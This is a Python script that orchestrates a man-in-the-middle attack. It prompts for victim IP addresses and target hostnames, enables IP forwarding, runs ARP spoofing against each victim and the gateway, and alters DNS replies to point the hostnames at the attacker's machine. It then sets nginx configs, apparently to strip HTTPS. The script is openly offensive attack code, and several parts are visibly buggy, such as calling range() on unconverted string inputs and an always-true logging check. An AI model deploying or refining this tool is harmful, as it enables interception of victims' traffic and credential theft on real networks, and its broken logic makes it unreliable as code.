from dns4 import startDNSaltering 
from ARP3 import startspoofing
from nginx import setnginxconfig
import threading

from scapy.all import *

import os

def getselfip(hwinterface):
    return get_if_addr(hwinterface)
    

if __name__ == "__main__":
    hardwareInterface = input("What is the hardware interface you want this to run on?: ")

    numvictims = input("How many victims do you want?: ")
    if not numvictims.isdigit():
        print("Received not a number, will assume one victim")
        numvictims = 1
    
    targetIps = []
    for i in range(numvictims):
        targetIp = input(f"What is the ip adddress of the victim {i}?: ")
        targetIps.append(targetIp)


    numhostnames = input("How many hostnames do you want to strip?: ")
    if not numhostnames.isdigit():
        print("Received not a number, will assume one hostname")
        numhostnames = 1

    hostnames = []
    for i in range(numhostnames):
        hostname = input(f"What is hostname {i} that you want to strip?: ")
        hostnames.append(hostname)


    logging = input("Would you like a full out or silent opertional mode (logging)? [F/S]: ")
    if logging != "F" or logging != "S":
        print("Invalid option, will assume silent mode")
        logging = "S"
        

    # Enable ip forwarding
    os.system("sysctl -w net.ipv4.ip_forward=1")

    ownip = getselfip(hardwareInterface)

    gatewayIp = conf.route.route("0.0.0.0")[2]

    print("Starting ARP spoofing...")
    for i in range(numvictims):
        spoofing = threading.Thread(target=startspoofing, args=(targetIps[i], gatewayIp, hardwareInterface))
        spoofing.start()
    print("Successfully started ARP spoofing.")


    dictionary = {
        # (f"{hostname}.").encode('UTF-8'): ownip,
    }

    for i in range(numhostnames):
        dictionary[(f"{hostnames[i]}.").encode('UTF-8')] = ownip


    print("Starting DNS altering...")
    for i in range(numvictims):
        dnsaltering = threading.Thread(target=startDNSaltering, args=(dictionary, targetIps[i]))
        dnsaltering.start()
    print("Successfully started DNS altering.")

    for i in range(numhostnames):
        setnginxconfig(hostname)
    print("Successfully set Nginx config")



